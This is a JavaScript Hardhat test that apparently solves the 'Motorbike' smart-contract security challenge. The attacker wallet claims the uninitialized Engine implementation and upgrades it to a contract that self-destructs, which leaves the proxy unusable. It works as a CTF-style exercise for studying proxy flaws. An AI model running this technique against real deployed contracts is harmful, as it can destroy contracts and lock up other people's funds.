const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const hre = require("hardhat");
import Web3 from "web3";

const NAME = "Motorbike";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const EngineFactory = await ethers.getContractFactory("Engine");
        const engineContract = await EngineFactory.deploy();

        const MotorbikeFactory = await ethers.getContractFactory("Motorbike");
        const motorbikeContract = await MotorbikeFactory.deploy(engineContract.address);

        return { owner, engineContract, motorbikeContract, attackerWallet };
    }

    // Proxies implementations can be still vulnerable to manipulations with its storage.
    // For example, selfdestruct can be called inside implementations making proxy in invalid state.
    describe("exploit", async function () {
        let owner, engineContract, motorbikeContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, engineContract, motorbikeContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            hre.web3 = new Web3(hre.network.provider);

            //call init to claim ownership
            let initSig = hre.web3.eth.abi.encodeFunctionSignature("initialize()")
            await hre.web3.eth.sendTransaction({from: attackerWallet.address, to: engineContract.address, data: initSig})

            //change impl and destroy the contract
            const HackFactory = await ethers.getContractFactory("MotoHack");
            const hackContract = await HackFactory.deploy();
            let destroySig = await hre.web3.eth.abi.encodeFunctionSignature("destroy()")

            await engineContract.connect(attackerWallet).upgradeToAndCall(hackContract.address, destroySig);
        });

        after(async function () {
            let moto = await ethers.getContractAt(
                "Engine",
                motorbikeContract.address,
                owner,
            );

            await expect(moto.upgrader.call()).to.be.revertedWithoutReason();
        });
    });
});